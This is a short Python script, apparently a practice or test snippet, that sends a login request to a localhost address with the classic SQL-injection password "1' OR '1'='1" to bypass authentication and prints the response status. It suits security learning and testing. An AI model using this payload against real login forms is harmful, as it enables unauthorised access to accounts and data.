import requests

URL = "http://localhost/"
PAYLOAD = {"username": "admin", "password": "1' OR '1'='1"}

r = requests.post(URL, json=PAYLOAD)
print(f"[+] SQL Injection → Statut {r.status_code}")